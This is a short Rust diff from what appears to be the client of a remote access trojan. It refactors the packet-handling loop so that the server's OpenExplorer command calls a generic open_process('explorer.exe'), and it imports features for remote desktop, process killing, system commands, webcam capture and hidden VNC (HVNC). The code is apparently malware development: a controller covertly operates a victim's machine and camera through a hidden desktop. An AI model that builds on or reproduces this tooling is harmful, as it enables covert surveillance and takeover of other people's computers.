@@ -3,7 +3,7 @@ use crate::features::remote_desktop::{start_remote_desktop, stop_remote_desktop,
 use crate::features::process::{process_list, kill_process};
 use crate::features::system_commands::system_commands;
 use crate::features::webcam::take_webcam;
-use crate::features::hvnc::{start_hvnc, stop_hvnc, open_explorer};
+use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
 use common::packets::*;
 use rand_chacha::ChaCha20Rng;
 use tokio::sync::oneshot;
@@ -125,7 +125,7 @@ pub async fn reading_loop(
             
             Ok(Some(ClientboundPacket::StopHVNC)) => stop_hvnc(),
             
-            Ok(Some(ClientboundPacket::OpenExplorer)) => open_explorer(),
+            Ok(Some(ClientboundPacket::OpenExplorer)) => open_process("explorer.exe"),
 
             Ok(Some(p)) => {
                 println!("!!Unhandled packet: {:?}", p);
